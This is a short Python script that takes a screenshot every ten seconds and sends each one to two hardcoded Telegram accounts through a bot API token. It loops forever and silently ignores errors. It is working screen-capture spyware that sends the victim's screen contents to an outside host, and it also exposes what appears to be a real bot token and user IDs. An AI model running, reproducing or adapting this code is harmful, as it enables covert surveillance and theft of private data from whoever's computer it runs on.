import time
import pyautogui
import io
import urllib.request
import uuid

BOT_TOKEN = "8484577605:AAHB7P9rlJZtbL22Wi4gkETvuJV95EF3_hA"
USER_IDS = [5155641417, 5408815833]
INTERVAL = 10

def send_screenshot():
    screenshot = pyautogui.screenshot()
    img_bytes = io.BytesIO()
    screenshot.save(img_bytes, format="PNG")
    img_bytes.seek(0)

    for uid in USER_IDS:
        boundary = uuid.uuid4().hex
        data = []

        data.append(f"--{boundary}".encode())
        data.append(b'Content-Disposition: form-data; name="chat_id"\r\n')
        data.append(str(uid).encode())

        data.append(f"--{boundary}".encode())
        data.append(b'Content-Disposition: form-data; name="photo"; filename="screen.png"')
        data.append(b'Content-Type: image/png\r\n')
        data.append(img_bytes.getvalue())

        data.append(f"--{boundary}--".encode())
        body = b"\r\n".join(data)

        req = urllib.request.Request(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
            data=body,
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Content-Length": str(len(body))
            }
        )

        urllib.request.urlopen(req)

print("Запущено")

while True:
    try:
        send_screenshot()
    except Exception as e:
        pass
    time.sleep(INTERVAL)
